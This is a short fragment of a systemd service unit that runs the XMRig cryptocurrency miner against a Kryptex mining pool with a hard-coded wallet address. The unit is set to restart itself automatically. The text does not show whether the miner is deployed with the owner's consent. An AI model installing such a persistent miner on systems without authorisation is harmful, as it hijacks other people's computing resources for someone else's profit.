...
[Service]
ExecStart=$XMRIG_BINARY -a rx/0 --url xtm-rx.kryptex.network:7038 --user 12JumnBTSpc1g6yxLTYPDbhxoUeB3JAf91MyTsEf1YjyGrwp4LAed4Sa6KMBfwKBKbpZz9s5fBHtogNK9oJMbNy9DhX/sallinux -k
Restart=always
RestartSec=5
